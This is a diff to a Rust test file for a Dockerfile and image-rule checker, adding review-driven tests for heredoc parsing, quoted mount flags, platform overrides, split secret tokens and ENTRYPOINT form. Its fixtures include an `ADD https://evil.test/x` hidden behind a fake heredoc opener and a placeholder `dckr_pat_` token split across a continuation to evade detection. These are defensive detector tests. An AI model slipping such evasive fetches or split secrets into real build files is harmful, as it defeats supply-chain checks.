@@ -1,8 +1,7 @@
 //! 012 T004, T006 (test-first, plan step S1). Targets `image::{check, name_ok, publishes, image_project}` and
 //! the constants of data-model.md "Constants" and "Check rules".
 //!
-//! Not yet registered: with `pub mod image;` in `lib.rs`, add `#[cfg(test)] mod image_tests;` beside it (T005), then
-//! remove each `#[ignore = "test-first"]` as its test passes (T007).
+//! Registered in `lib.rs` beside `pub mod image;` (T005); only the `docker/hello-static` test stays ignored until T018.
 //!
 //! Every failing case is the passing fixture (`tests/fixtures/image/pass`) with one change, built in memory, so a
 //! rule that never fires cannot hide: `the_passing_fixture_returns_empty` pins the baseline and each helper asserts
@@ -1074,4 +1073,95 @@ fn step_image_fails_for_unpinned_images_on_any_step() {
     );
     let extra = format!("{TOML}\n[steps.extra]\nimage = \"alpine\"\ncommands = [\"true\"]\n");
     expect_has(ids_toml(&extra), "step-image", "a second, unpinned step");
+}
+
+// ---- review fixes: heredoc openers, quoted flags, platform overrides, split tokens, JSON form ----
+
+#[test]
+fn a_heredoc_marker_that_is_not_a_whole_word_is_refused() {
+    // BuildKit opens a heredoc only for a whole word `\d*<<-?WORD`; anything else must not skip lines
+    for line in [
+        "RUN echo a<<#",
+        "RUN echo \"<<X\"",
+        "RUN [\"a\",\"<<X\"]",
+        "RUN echo x<<<y",
+        "COPY a<<X /b",
+        "RUN echo \"a <<X\"",
+        "RUN cat <<\"X",
+    ] {
+        expect_has(ids(&in_build(line)), "heredoc", line);
+    }
+    let fd = in_build("RUN cat 3<<EOF\nbody\nEOF");
+    assert_eq!(ids(&fd), Vec::<&str>::new(), "fd-prefixed opener");
+}
+
+#[test]
+fn a_hidden_add_after_a_fake_heredoc_is_still_seen() {
+    // 012 review MAJOR 1: `a<<#` must not skip the ADD that follows
+    let got = ids(&in_build("RUN echo a<<#\nADD https://evil.test/x /y\n#"));
+    expect_has(got.clone(), "heredoc", "fake opener");
+    expect_has(got, "instruction", "ADD after the fake opener");
+}
+
+#[test]
+fn quoted_csv_fields_in_mount_and_from_are_refused() {
+    // 012 review MAJOR 2
+    for line in [
+        "RUN --mount=type=bind,\"from=alpine\",target=/x true",
+        "RUN --mount=type=bind,\"type=secret\",target=/x true",
+        "RUN --mount=type=bind,'from=alpine',target=/x true",
+        "COPY --from=\"alpine\" /a /a",
+        "COPY --from='build' /a /a",
+    ] {
+        let got = ids(&in_build(line));
+        expect_has(got.clone(), "external-source", line);
+        expect_has(got, "secret-flag", line);
+    }
+}
+
+#[test]
+fn assigning_a_platform_variable_is_emulation() {
+    // 012 review MINOR 2
+    for var in [
+        "BUILDPLATFORM",
+        "TARGETPLATFORM",
+        "TARGETARCH",
+        "TARGETOS",
+        "BUILDARCH",
+    ] {
+        for line in [
+            format!("ARG {var}=arm64"),
+            format!("ENV {var}=arm64"),
+            format!("ENV {var} arm64"),
+        ] {
+            expect_has(ids(&in_build(&line)), "emulation", &line);
+        }
+    }
+    assert_eq!(ids(&in_build("ARG TARGETOS")), Vec::<&str>::new());
+}
+
+#[test]
+fn a_token_split_across_a_continuation_is_found() {
+    // 012 review MINOR 3: neither half reaches 20, the joined text does
+    let df = in_build("RUN echo dckr_pat_AAAAAAAAAA\\\nAAAAAAAAAA");
+    expect_has(ids(&df), "secret-value", "split token");
+}
+
+#[test]
+fn json_form_must_be_a_string_array() {
+    // 012 review MINOR 4: anything else is shell form
+    for bad in [
+        "ENTRYPOINT [\"/hello\"",
+        "ENTRYPOINT [/hello]",
+        "ENTRYPOINT [1]",
+        "ENTRYPOINT [\"/hello\"] x",
+    ] {
+        let df = df_with("ENTRYPOINT [\"/hello\"]", bad);
+        expect_has(ids(&df), "final-shell", bad);
+    }
+    let ok = df_with(
+        "ENTRYPOINT [\"/hello\"]",
+        "ENTRYPOINT [ \"/hello\", \"-v\" ]",
+    );
+    assert_eq!(ids(&ok), Vec::<&str>::new());
 }
